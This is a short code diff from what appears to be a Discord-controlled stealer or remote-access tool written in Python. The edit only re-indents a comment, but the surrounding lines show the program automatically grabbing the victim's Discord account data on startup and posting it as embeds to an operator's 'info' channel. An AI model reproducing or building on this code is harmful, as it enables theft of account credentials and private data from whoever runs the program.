@@ -206,7 +206,7 @@ async def on_ready():
         #.log Sent system information on info channel
 
         accounts = grab_discord.initialize(False)
-            #.log Grabbed Discord (Auto)
+        #.log Grabbed Discord (Auto)
         for account in accounts:
             reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌')
                 #.log Sent embed with Discord account data (Auto)
